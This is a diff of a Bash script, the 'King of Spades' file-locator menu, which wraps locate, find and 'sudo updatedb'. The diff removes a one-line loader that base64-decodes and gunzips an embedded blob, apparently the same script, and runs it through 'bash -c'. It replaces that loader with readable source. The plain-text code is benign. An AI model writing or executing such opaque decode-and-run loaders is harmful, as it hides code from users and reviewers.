@@ -1,1 +1,125 @@
-bash -c "$(echo H4sICNDndWcAA0tpbmdfb2ZfU3BhZGVzAN1XbW/bNhD+rl9xU405XmP5rU2BGh0QNE4xLOmKJNtQJIVAS5RNWKJckXKitvnvPZKSLNuKa6PpsE0fbPl499zx7jke/eSnzpjxzpiIqWW9fn/89lXzpjsYXPeGg6OoaV2MLkdXuaiLv99cjEYVlb5WOVkKeih4Pzo7++PvpWyAMusJnFOeQhAnIKcUfmd8AnEAl3PiUwGvSeJbM5S5ceAKLXMj1D9owWcL8PFCShL9Rr1pDG0KduOzCvfeXkpt0I/7WM8G9BfY+qxtatvzZR/sY39BuEd9OGUhhbPYIxLTuA/2o6Vkr7j3fGqxr6ZMgIf0gJAuaEImmNhmqFJAm4fQDBj38ZtwH0iRpVSykEmGijLeiv0xZd4szLQ1DQLqSbag+NvAQ4DZFnrRZwkuxgliOjvG/SNz0nPgEtvBm+p2IjpQwLcizOw7sPsl9jgzwIJ9oo8T96CKHcU+CxgmmsUcJIt291GL/cyBP+d+UTbAN4Jn2t6B12I/d+AvRm8Bs0u5VITxPCoEUs1Q5HuwjxwY3TG5b5w7YP+QnjcHr54K+cmbUOJDew72iEuaQBanCaAm8+hLjMS8mSNclaNhBMC4VYTea4HQrHB15YbDcqVfrowzV9OwsjioLiKZXM2hisKzFqSaEW5Jhsrq8xYssKauqalrKlpVOGoBVYXpVoW/tPIU/8YXJGR+vj8HrrDpyIQw7thDECGlc+gNoWaiFWhUEM+6V3NxeytbldzsMA1XwE5zsJMCbGvl1FjW7jmJtNmcSJRzdYqKElYVVWm5SsvSOCwAL44idVC2F8Xh+fOvHZ8uOjwNw6GCXta7ErK+TeQxq9mpwr6xGyX+jQ2pUAsG1HGc1R2YXYg0lOJV4yD3XLG3W6UaBnl9DW0OjdwAPnxYC2xLcIWXl5v+l21XIC/XaCjoQ/B4bbp/G+cnSESkycDa7m9pgkWJU+7X7Dxg1oaTNQejJFElKwZmWSecqTyW2IVCkjCkdehmT++QaYIWioD9YAqi23xOvBkOZIye41cCB9SZODiM5/IQsjRqOQYN46zwjUMP2gLaiabeu0S1HeEZzGimmJZQmRrOKT6qjsGqG5yablrtIJ1KHC3qqLBWT47dWwftdd9cotXWfokYZ1EamfmYb73XPcePNy3VJbiuXdfakrsaW2Xcz43JnTFeD7WuZfKNU3lLKRK8cKyvLo0CaaN51NUJOtCW2Rw5hjVRJk/t0tzORW27xLChv2xrnF4iTuS2ABXf5iGVKwT7Z7mwcc2wNqfGXuQ4rwJeofVWkvA0GuMX/inwSSaKUrdf6LqFREh4oVcO4emgq4Vx6OvDmHBAiVrThFAve5DBbBtvKA3tV3+QSfxNEkR6itra6j9Q7fzKV46uYtJba5N/hwprKJVE3f0nueHaRlZHnXHij/cZdqWbjZgd818nYpOpBElm2L9wO0WN2rEnUj8uA3jY3enKZTjXR2N93Qkw3mwNe5dpUrj9v86TbZd9a/PWuAO5NOJFgXhcIKrqiDWKbZTwjAlNmAcC+mZLE93S7d6/vZvrxF8BuTyjtJ4SAAA= | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RESET='\033[0m'
+GREEN='\033[1;32m'
+RED='\033[1;31m'
+YELLOW='\033[1;33m'
+
+# Menu for the King of Spades Card
+king_of_spades_menu() {
+    clear
+    echo -e "${CYAN}"
+    echo "      _________________________________________________________________________"
+    echo "     |                              King of Spades                             |"
+    echo "     |                          Advanced File Locator                          |"
+    echo "     |_________________________________________________________________________|"
+    echo "     |                                                                         |"
+    echo "     |  This card leverages 'locate', 'find', and advanced utilities to        |"
+    echo "     |  quickly and effectively locate files and directories.                  |"
+    echo "     |                                                                         |"
+    echo "     |  1. Search for a file or directory                                      |"
+    echo "     |  2. Search by file size                                                 |"
+    echo "     |  3. Search by modification time                                         |"
+    echo "     |  4. Update file database                                                |"
+    echo "     |  5. View recently accessed files                                        |"
+    echo "     |  6. Exit                                                                |"
+    echo "     |_________________________________________________________________________|"
+    echo -e "${RESET}"
+    read -p "Enter your choice: " choice
+    case $choice in
+        1) search_file ;;
+        2) search_by_size ;;
+        3) search_by_mod_time ;;
+        4) update_database ;;
+        5) view_recent_access ;;
+        6) exit 0 ;;
+        *) echo "Invalid choice. Try again."; sleep 1; king_of_spades_menu ;;
+    esac
+}
+
+# Search for a file or directory
+search_file() {
+    clear
+    echo -e "${CYAN}Search for a File or Directory${RESET}"
+    read -p "Enter the file name or pattern to search for: " file_name
+
+    if command -v locate &>/dev/null; then
+        echo -e "${GREEN}Searching for \"$file_name\" using locate...${RESET}"
+        results=$(locate "$file_name")
+        if [[ -n $results ]]; then
+            echo -e "${GREEN}Search results:${RESET}"
+            echo "$results"
+        else
+            echo -e "${RED}No files matching \"$file_name\" were found.${RESET}"
+        fi
+    else
+        echo -e "${RED}Error: 'locate' command is not installed.${RESET}"
+        echo "Please install it using your package manager (e.g., apt, yum)."
+    fi
+
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    king_of_spades_menu
+}
+
+# Search files by size
+search_by_size() {
+    clear
+    echo -e "${CYAN}Search by File Size${RESET}"
+    read -p "Enter minimum size (e.g., 10M, 1G): " min_size
+    read -p "Enter maximum size (e.g., 100M, 2G): " max_size
+
+    echo -e "${GREEN}Searching for files between $min_size and $max_size...${RESET}"
+    find / -type f -size +"$min_size" -size -"$max_size" 2>/dev/null | sort
+    echo -e "${GREEN}Search completed.${RESET}"
+
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    king_of_spades_menu
+}
+
+# Search files by modification time
+search_by_mod_time() {
+    clear
+    echo -e "${CYAN}Search by Modification Time${RESET}"
+    read -p "Enter number of days (e.g., -7 for last 7 days, +30 for older than 30 days): " days
+
+    echo -e "${GREEN}Searching for files modified $days days ago...${RESET}"
+    find / -type f -mtime "$days" 2>/dev/null | sort
+    echo -e "${GREEN}Search completed.${RESET}"
+
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    king_of_spades_menu
+}
+
+# Update the file database
+update_database() {
+    clear
+    echo -e "${CYAN}Updating File Database${RESET}"
+
+    if command -v updatedb &>/dev/null; then
+        echo -e "${GREEN}Updating the file database. This might take a while...${RESET}"
+        sudo updatedb
+        echo -e "${GREEN}File database updated successfully.${RESET}"
+    else
+        echo -e "${RED}Error: 'updatedb' command is not installed.${RESET}"
+        echo "Please install it using your package manager (e.g., apt, yum)."
+    fi
+
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    king_of_spades_menu
+}
+
+# View recently accessed files
+view_recent_access() {
+    clear
+    echo -e "${CYAN}View Recently Accessed Files${RESET}"
+
+    echo -e "${GREEN}Listing recently accessed files...${RESET}"
+    find / -type f -atime -1 2>/dev/null | sort
+    echo -e "${GREEN}Search completed.${RESET}"
+
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    king_of_spades_menu
+}
+
+king_of_spades_menu
